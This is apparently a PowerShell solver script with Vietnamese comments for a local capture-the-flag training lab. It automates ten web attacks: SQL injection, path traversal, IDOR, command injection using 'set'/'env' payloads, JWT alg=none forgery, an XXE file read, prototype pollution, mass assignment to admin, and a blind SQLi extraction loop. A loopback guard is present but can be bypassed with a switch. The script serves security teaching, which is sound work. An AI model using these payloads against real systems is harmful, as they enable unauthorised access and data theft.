<#
.SYNOPSIS
    Solve-All.ps1 — giải TRỌN 10 thử thách CTF của SecLab (PowerShell 5.1+).

.DESCRIPTION
    Chạy:  powershell -ExecutionPolicy Bypass -File solutions/ctf/scripts/Solve-All.ps1 [-Base <url>]
           mặc định -Base = http://127.0.0.1:3000  (lab VULN đang chạy)

    Chỉ hoạt động trên bản vuln. Đọc comment từng hàm — mỗi hàm là một bài học.
#>
param(
    [string]$Base = 'http://127.0.0.1:3000',
    [switch]$IOwnThisTarget
)
$Base = $Base.TrimEnd('/')

# Guard an toàn: chỉ chạy trên loopback trừ khi bạn xác nhận sở hữu mục tiêu.
$_host = ([uri]$Base).Host
if ($_host -notin @('127.0.0.1', 'localhost', '::1') -and -not $IOwnThisTarget) {
    Write-Host "  [X] Tu choi: muc tieu \"$_host\" khong phai loopback."
    Write-Host "      Them -IOwnThisTarget neu day la server ban so huu."
    exit 2
}
$ErrorActionPreference = 'Stop'

# Invoke-WebRequest ném exception trên 4xx → bọc lấy status thật.
function Get-Status([string]$Path) {
    try {
        $null = Invoke-WebRequest -Uri "$Base$Path" -UseBasicParsing -TimeoutSec 10
        return 200
    } catch {
        if ($_.Exception.Response) { return [int]$_.Exception.Response.StatusCode }
        throw
    }
}
function Get-Body([string]$Path, [hashtable]$Headers = @{}) {
    try {
        return (Invoke-WebRequest -Uri "$Base$Path" -UseBasicParsing -TimeoutSec 10 -Headers $Headers).Content
    } catch {
        if ($_.Exception.Response) {
            $sr = New-Object IO.StreamReader($_.Exception.Response.GetResponseStream())
            return $sr.ReadToEnd()
        }
        throw
    }
}
function Post-Body([string]$Path, [string]$Data, [string]$CType = 'application/x-www-form-urlencoded', [switch]$ReturnHeaders) {
    try {
        $r = Invoke-WebRequest -Uri "$Base$Path" -Method Post -UseBasicParsing -TimeoutSec 10 -Body $Data -ContentType $CType
        if ($ReturnHeaders) { return $r }
        return $r.Content
    } catch {
        if ($_.Exception.Response) {
            if ($ReturnHeaders) { return $null }
            $sr = New-Object IO.StreamReader($_.Exception.Response.GetResponseStream())
            return $sr.ReadToEnd()
        }
        throw
    }
}
function UrlEnc([string]$s) { return [System.Uri]::EscapeDataString($s) }
function Grep-Flag([string]$Prefix, [string]$Text) {
    if ($Text -match "FLAG\{$Prefix-[0-9a-f]+\}") { return $Matches[0] }
    return $null
}

# ── CTF #1 · SQLi ──
function Solve01 { Grep-Flag 'sqli' (Get-Body "/search?q=$(UrlEnc "' OR 1=1 --")") }

# ── CTF #2 · Traversal ──
function Solve02 { Grep-Flag 'trav' (Get-Body '/download?name=../flag-ctf.txt') }

# ── CTF #3 · IDOR ──
function Solve03 { Grep-Flag 'idor' (Get-Body '/api/users/4') }

# ── CTF #4 · /admin ──
function Solve04 { Grep-Flag 'admin' (Get-Body '/admin') }

# ── CTF #5 · Command Injection — thử cả 2 dấu nối ──
function Solve05 {
    foreach ($p in @('127.0.0.1 & set SECLAB', '127.0.0.1; env')) {
        $f = Grep-Flag 'cmd' (Get-Body "/tools/ping?host=$(UrlEnc $p)")
        if ($f) { return $f }
    }
}

# ── CTF #6 · JWT alg=none ──
function Solve06 {
    function B64u([string]$j) {
        [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($j)) -replace '\+','-' -replace '/','_' -replace '=',''
    }
    $tok = "$(B64u '{"alg":"none","typ":"JWT"}').$(B64u '{"sub":"ctfsvc","role":"svc"}')."
    Grep-Flag 'jwt' (Get-Body "/api/profile?token=$(UrlEnc $tok)")
}

# ── CTF #7 · XXE ──
function Solve07 {
    $b = '<!DOCTYPE r [<!ENTITY x SYSTEM "file:///flag-xxe.txt">]><i><item>&x;</item></i>'
    Grep-Flag 'xxe' (Post-Body '/api/import' $b 'application/xml')
}

# ── CTF #8 · Prototype Pollution ──
function Solve08 {
    Post-Body '/api/config' '{"__proto__":{"isAdmin":true}}' 'application/json' | Out-Null
    Grep-Flag 'proto' (Get-Body '/api/config')
}

# ── CTF #9 · Mass Assignment → login → /api/me ──
function Solve09 {
    $user = "solver$([int](Get-Date -UFormat %s))"
    Post-Body '/api/register?role=admin' "username=$user&password=pw12345" | Out-Null
    $r = Invoke-WebRequest -Uri "$Base/login" -Method Post -UseBasicParsing `
         -Body "username=$user&password=pw12345" -ContentType 'application/x-www-form-urlencoded'
    $sc = $r.Headers['Set-Cookie']
    $sid = if ($sc -match 'session=([a-f0-9]+)') { $Matches[1] } else { '' }
    # Cookie lab không khai Path → WebSession mặc định chỉ gửi cho /login.
    # Gắn thủ công với Path='/' để mọi endpoint nhận được.
    $sess = New-Object Microsoft.PowerShell.Commands.WebRequestSession
    $sess.Cookies.Add((New-Object System.Net.Cookie('session', $sid, '/', ([Uri]$Base).Host)))
    $me = Invoke-WebRequest -Uri "$Base/api/me" -UseBasicParsing -WebSession $sess
    Grep-Flag 'mass' $me.Content
}

# ── CTF #10 · Blind SQLi — oracle boolean 200/404 ──
function Solve10 {
    $charset = 'FLAG{}blind-0123456789abcdefxyz'.ToCharArray()
    $flag = ''
    for ($pos = 1; $pos -le 40; $pos++) {
        $hit = ''
        foreach ($ch in $charset) {
            $q = "AB-100' AND (SELECT substr(flag,$pos,1) FROM ctf_blind)='$ch' --"
            if ((Get-Status "/track?code=$(UrlEnc $q)") -eq 200) { $hit = [string]$ch; break }
        }
        if (-not $hit) { break }
        $flag += $hit
        if ($hit -eq '}') { break }
    }
    if ($flag) { return $flag }
}

function Verify([int]$Id, [string]$Flag) {
    $j = Get-Body "/_lab/verify?id=$Id&flag=$(UrlEnc $Flag)" | ConvertFrom-Json
    return $j.ok -eq $true
}

$Names = 'SQLi','Traversal','IDOR','Admin','CmdInj','JWT','XXE','ProtoPoll','MassAssign','BlindSQLi'
Write-Host "`n  SecLab CTF solver - target $Base`n"
$solved = 0
for ($i = 0; $i -lt 10; $i++) {
    $n = $i + 1
    Write-Host ("  [#{0:d2}] {1,-10} " -f $n, $Names[$i]) -NoNewline
    $fn = "Solve{0:d2}" -f $n
    try { $flag = & $fn } catch { Write-Host "x loi: $($_.Exception.Message)"; continue }
    if (-not $flag) { Write-Host 'x khong lay duoc co (hardened? vuln chua chay?)'; continue }
    if (Verify $n $flag) {
        $solved++
        Write-Host "$flag  ->  OK +diem"
    } else {
        Write-Host "$flag  ->  x server tu choi"
    }
}
Write-Host "`n  KET QUA: $solved/10 thu thach`n"
exit $(if ($solved -eq 10) { 0 } else { 1 })
